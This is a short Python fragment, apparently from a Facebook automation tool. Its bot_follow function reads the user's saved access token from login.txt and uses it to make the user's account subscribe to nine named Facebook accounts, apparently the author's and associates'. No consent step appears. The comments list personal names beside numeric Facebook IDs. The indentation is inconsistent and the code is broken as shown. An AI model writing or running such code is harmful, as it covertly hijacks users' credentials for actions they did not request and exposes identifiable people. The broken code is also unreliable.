def bot_follow():

	try:		toket=open('login.txt','r').read()

	except IOError:

		print("\n[!] Token invalid")

		logs()

    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X

    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel

    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara

    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah

    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin

    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara

        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket) #Muh Rizal Fiansyah

        requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=' + toket) #Rizal F

        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan

    	menu()   
